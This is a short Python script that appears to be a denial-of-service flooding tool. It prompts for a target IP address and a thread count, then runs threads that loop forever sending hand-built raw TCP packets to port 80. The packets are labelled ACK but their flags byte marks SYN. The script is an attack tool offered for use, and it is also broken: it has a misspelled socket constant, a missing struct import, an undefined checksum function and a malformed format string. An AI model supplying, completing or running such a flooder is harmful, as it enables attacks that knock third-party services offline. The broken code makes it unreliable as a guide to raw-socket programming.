import socket

import threading

def send_ack_packet(ip_address):

    # creating a raw socket for sending ACK packet

    try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

        sock.setsockopt(socket.IPPROTOIP, socket.IP_HDRINCL, 1)

        sock.connect((ip_address, 80))

        source_ip = "127.0.0.1" #replace with your machine's IP address

        dest_ip = ip_address

        source_port = 12345

        dest_port = 80

        sequence_number = 100

        ack_number = 0

        window_size = 2048

        ip_header = b'\x45\x00\x00\x28\x00\x00\x40\x00\x40\x06\x00\x00' + bytes(map(int,source_ip.split('.'))) + bytes(map(int,dest_ip.split('.')))

        tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence_number, ack_number, 5 << 4, 2, window_size, 0, 0)

        pseudo_checksum = struct.pack('!4s4sBBH', bytes(map(int,source_ip.split('.'))), bytes(map(int,dest_ip.split('.'))), 0, socket.IPPROTO_TCP, len(tcp_header))

        tcp_checksum = checksum(pseudo_checksum + tcp_header)

        tcp_header = struct.pack('!HHLLBBH H', source_port, dest_port, sequence_number, ack_number, 5 << 4, 2, window_size, tcp_checksum, 0)

        packet = ip_header + tcp_header

        sock.send(packet)

    except Exception as e:

        print(e)

def flood(ip_address):

    while True:

        send_ack_packet(ip_address)

if __name__ == '__main__':
    ipad = input ("enter ip target address: ")
    th = int(input("enter threads: "))
    for i in range(th):

        t = threading.Thread(target=flood, args=(ipad,))

        t.start()
